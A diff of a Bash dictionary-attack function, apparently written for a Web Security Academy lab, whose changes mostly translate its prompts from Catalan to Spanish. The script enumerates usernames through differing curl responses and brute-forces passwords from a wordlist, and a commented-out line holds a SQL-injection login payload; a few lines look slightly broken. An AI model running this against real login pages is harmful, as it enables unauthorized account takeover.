@@ -2,11 +2,11 @@
 function ataque_diccionario() {
 start=1
 URL=$(echo -e "$url")
-echo "Digam un usuari o un fitxer txt d'usuaris"
+echo "Dime un usuario o un fichero txt con un listado de usuarios"
 read document
 if [ -f  $document ]
 then
-    echo "Recorda que aquest procés pot trigar minuts."
+    echo "Recuerda que este proceso puede tardar minutos."
     total=$(wc -l < $document)
     while [ $start -le $total ]
         do
@@ -14,7 +14,7 @@ then
     #    curl -s -d "csrf=!284453q&username=administrator'--&password=a" https://ac011f251f062c74c0fb0f6f009a0020.web-security-academy.net/login 
         if [[ $(curl -s -d "username=$test&password=a" $URL) != $(curl -s -d "username=a&password=a" $URL) ]]
         then
-            echo -e "username is $test"
+            echo -e "El usuario és $test"
             username=$test
             break 1
         fi
@@ -28,20 +28,20 @@ else
             username=$test
             break 1
         else
-            echo "username incorrecto"
+            echo "username incorrecto."
         fi
         ((start = start + 1))
     #    echo $start
     done
 fi
 
-echo "Vols pasar un diccionari de contrasenyes o fem servir un diccionari ja existent?"
+echo "Quieres utilizar un diccionario de contraseñas en especifico? Indica la ruta del fichero de ser así, si no omite la respuesta."
 read document
 if [ -f  $document ] 
 then
-    echo "Ficher valid"
+    echo "Fichero valido"
 else
-    echo "El Fichero no es valid, usaremos un diccionario propio"
+    echo "El Fichero no es valido, usaremos un diccionario propio"
     document= b.txt
 start=1
 total=$(wc -l < $document)
@@ -57,5 +57,5 @@ while [ $start -le $total ]
     fi
     ((start = start + 1))
 done
-echo -e "Usuari es $usuari y usuari es $password"
+echo -e "L'usuari es $usuari y la seva password es $password"
 }
